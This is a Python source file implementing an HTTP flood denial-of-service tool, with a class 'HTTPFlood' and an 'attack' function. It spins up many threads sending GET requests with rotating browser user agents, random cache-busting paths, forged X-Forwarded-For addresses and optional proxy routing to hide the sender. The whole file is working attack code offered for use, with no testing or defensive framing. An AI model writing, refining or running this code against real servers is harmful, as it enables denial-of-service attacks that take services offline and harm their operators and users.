import random
import socket
import threading
import time

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
]

class HTTPFlood:
    def __init__(self, target, port, threads, duration, spoof=False, proxies=None, user_agents=None):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.stop_event = threading.Event()
        self.proxies = proxies or []
        self.user_agents = user_agents or DEFAULT_USER_AGENTS

    def _build_request(self, path):
        ua = random.choice(self.user_agents)
        headers = (
            f"User-Agent: {ua}\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            "Accept-Language: en-US,en;q=0.5\r\n"
            "Accept-Encoding: gzip, deflate\r\n"
            "Connection: keep-alive\r\n"
            "Cache-Control: no-cache\r\n"
            f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
        )
        return f"GET {path} HTTP/1.1\r\nHost: {self.target}\r\n{headers}\r\n"

    def _build_proxy_request(self, path):
        ua = random.choice(self.user_agents)
        absolute_uri = f"http://{self.target}:{self.port}{path}"
        headers = (
            f"User-Agent: {ua}\r\n"
            "Accept: */*\r\n"
            "Connection: close\r\n"
            f"Host: {self.target}\r\n"
        )
        return f"GET {absolute_uri} HTTP/1.1\r\n{headers}\r\n"

    def _send_http(self):
        while not self.stop_event.is_set():
            sock = None
            try:
                path = f"/?{random.randint(1, 999999)}"
                if self.proxies:
                    proxy = random.choice(self.proxies)
                    proxy_host, proxy_port = proxy.rsplit(":", 1)
                    proxy_port = int(proxy_port)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(8)
                    sock.connect((proxy_host, proxy_port))
                    request = self._build_proxy_request(path)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(8)
                    sock.connect((self.target, self.port))
                    request = self._build_request(path)
                sock.send(request.encode())
                time.sleep(0.05)
            except Exception:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._send_http)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False, proxies=None, user_agents=None):
    flood = HTTPFlood(target, port, threads, duration, spoof, proxies, user_agents)
    flood.start()
